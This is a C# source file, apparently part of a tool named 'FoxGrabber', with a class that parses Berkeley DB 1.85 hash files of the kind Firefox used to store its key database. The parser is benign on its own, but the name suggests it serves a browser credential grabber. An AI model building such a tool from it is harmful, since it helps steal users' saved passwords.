﻿namespace FoxGrabber
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Text;

    class BerkeleyDB
    {
        public string Version { get; set; }
        public List<KeyValuePair<string, string>> Keys { get; private set; }


        public BerkeleyDB(string FileName)
        {
            var entire = new List<byte>();
            this.Keys = new List<KeyValuePair<string, string>>();

            using (var dbReader = new BinaryReader(File.OpenRead(FileName)))
            {
                int pos = 0;

                while (pos < (int)dbReader.BaseStream.Length)
                {
                    entire.Add(dbReader.ReadByte());
                    pos += sizeof(byte);
                }
            }
            int pageSize = BitConverter.ToInt32(this.Extract(entire.ToArray(), 12, 4, true), 0);

            if (!BitConverter.ToString(this.Extract(entire.ToArray(), 0, 4, false)).Replace("-", "").Equals("00061561"))
            {
                Version = "Unknow database format";
            }
            else
            {
                this.Version = "Berkelet DB";

                if (BitConverter.ToString(this.Extract(entire.ToArray(), 4, 4, false)).Replace("-", "").Equals("00000002"))
                {
                    this.Version += " 1.85 (Hash, version 2, native byte-order)";
                }

                int nbKey = int.Parse(BitConverter.ToString(this.Extract(entire.ToArray(), 0x38, 4, false)).Replace("-", ""));
                int page = 1;

                while (this.Keys.Count < nbKey)
                {
                    string[] address = new string[(nbKey - this.Keys.Count) * 2];

                    for (int i = 0; i < (nbKey - this.Keys.Count) * 2; i++)
                    {
                        address[i] = BitConverter.ToString(this.Extract(entire.ToArray(), (pageSize * page) + 2 + (i * 2), 2, true)).Replace("-", "");
                    }

                    Array.Sort(address);

                    for (int i = 0; i < address.Length; i = i + 2)
                    {
                        int startValue = Convert.ToInt32(address[i], 16) + (pageSize * page);
                        int startKey = Convert.ToInt32(address[i + 1], 16) + (pageSize * page);
                        int end = ((i + 2) >= address.Length) ? pageSize + (pageSize * page) : Convert.ToInt32(address[i + 2], 16) + (pageSize * page);

                        string key = Encoding.ASCII.GetString(this.Extract(entire.ToArray(), startKey, end - startKey, false));
                        string value = BitConverter.ToString(this.Extract(entire.ToArray(), startValue, startKey - startValue, false));

                        if (!string.IsNullOrWhiteSpace(key))
                        {
                            this.Keys.Add(new KeyValuePair<string, string>(key, value));
                        }

                    }
                    page++;
                }

            }

        }

        private byte[] Extract(byte[] source, int start, int length, bool littleEndian)
        {
            byte[] dest = new byte[length];
            int j = 0;

            for (int i = start; i < start + length; i++)
            {
                dest[j] = source[i];
                j++;
            }

            if (littleEndian)
            {
                Array.Reverse(dest);
            }
            return dest;
        }

        private byte[] ConvertToLittleEndian(byte[] source)
        {
            Array.Reverse(source);
            return source;
        }
    }
}